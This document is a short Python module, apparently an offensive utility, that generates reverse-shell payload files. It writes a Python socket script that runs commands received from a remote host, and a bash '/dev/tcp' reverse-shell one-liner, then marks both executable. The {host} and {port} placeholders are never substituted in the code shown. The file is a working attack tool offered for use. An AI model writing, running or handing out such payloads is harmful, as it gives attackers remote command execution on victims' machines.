"""
Payload Generator Utility
This module provides functionality to generate various types of payloads.
"""

import os
import random
import string
from pathlib import Path

class PayloadGenerator:
    def __init__(self, output_dir="payloads"):
        """
        Initialize the payload generator.
        
        Args:
            output_dir: Directory to store generated payloads
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def generate_shell_payload(self, payload_type="python", output_file=None):
        """
        Generate a basic shell payload.
        
        Args:
            payload_type: Type of payload to generate (python, bash, etc.)
            output_file: Optional output file path
            
        Returns:
            Path to the generated payload file
        """
        if not output_file:
            output_file = f"shell_{payload_type}_{random.randint(1000, 9999)}.{payload_type}"
        
        output_path = self.output_dir / output_file
        
        if payload_type == "python":
            payload = """#!/usr/bin/env python3
import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('{host}', {port}))
    while True:
        command = s.recv(1024).decode()
        if 'terminate' in command:
            s.close()
            break
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

if __name__ == '__main__':
    connect()
"""
        elif payload_type == "bash":
            payload = """#!/bin/bash
bash -i >& /dev/tcp/{host}/{port} 0>&1
"""
        else:
            raise ValueError(f"Unsupported payload type: {payload_type}")

        with open(output_path, 'w') as f:
            f.write(payload)
        
        os.chmod(output_path, 0o755)
        return output_path

    def generate_random_string(self, length=32):
        """
        Generate a random string of specified length.
        
        Args:
            length: Length of the random string
            
        Returns:
            Random string
        """
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
